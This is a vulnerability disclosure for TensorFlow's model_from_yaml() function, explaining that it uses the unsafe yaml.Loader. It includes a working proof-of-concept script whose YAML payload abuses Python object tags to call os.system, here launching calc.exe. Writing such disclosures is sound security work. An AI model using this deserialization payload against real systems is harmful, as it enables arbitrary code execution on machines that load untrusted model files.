# Description

`TensorFlow` is an end-to-end open source platform for machine learning. It has a comprehensive, flexible ecosystem of tools, libraries, and community resources that lets researchers push the state-of-the-art in ML and developers easily build and deploy ML-powered applications. It is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

`model_from_yaml()` function parses a yaml model configuration file and returns a model instance. It uses the vulnerable `yaml.Loader` which causes code execution.

# Proof of Concept

Installation
```bash
pip install tensorflow
```

Run `exploit.py`
```python
#!/usr/bin/env python3

from tensorflow.keras import models

payload = '''
!!python/object/new:type
args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
listitems: "__import__('os').system('calc.exe')"
'''

models.model_from_yaml(payload)
```
